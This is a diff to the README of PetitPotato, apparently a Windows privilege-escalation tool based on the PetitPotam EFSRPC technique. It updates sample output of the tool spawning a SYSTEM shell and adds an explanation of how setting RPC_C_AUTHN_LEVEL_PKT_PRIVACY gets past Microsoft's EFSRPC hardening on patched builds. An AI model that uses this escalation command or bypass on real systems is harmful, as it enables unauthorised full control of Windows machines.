@@ -40,7 +40,7 @@ C:\Users\Administrator\Desktop>PetitPotato.exe 3 cmd.exe
 [+] OpenThreadToken OK.
 [+] DuplicateTokenEx OK.
 [+] CreateProcessAsUser OK.
-Microsoft Windows [版本 10.0.18363.592]
+Microsoft Windows [Version 10.0.20348.1547]
 (c) 2019 Microsoft Corporation. All rights reserved.
 
 C:\Windows\system32>whoami
@@ -56,8 +56,9 @@ C:\Windows\system32>
 ## Update on 2023/03/14
 
 PetitPotam does not work on newer versions of Windows due to the limitations of related patches. However, setting AuthnLevel to `RPC_C_AUTHN_LEVEL_PKT_PRIVACY` via `RpcBindingSetAuthInfoW` before calling EFS works on latest systems.
+> In December 2021, Microsoft released a patch for a different EFSRPC vulnerability: CVE-2021-43217. As part of the remediation for that issue, Microsoft implemented some hardening measures on EFSRPC communication. In particular, EFSRPC clients would need to use RPC_C_AUTHN_LEVEL_PKT_PRIVACY when using EFSRPC. If the client fails to do so, then the client is rejected and a Windows application event is generated.
 
-At present, the project can perfectly elevate to SYSTEM authority on Windows 21H2 10.0.20348.1547
+At present, the project can perfectly elevate to SYSTEM on Windows 21H2 10.0.20348.1547.
 
 ![image-20221030165055659](/images/image-20221030165155659.png)
 
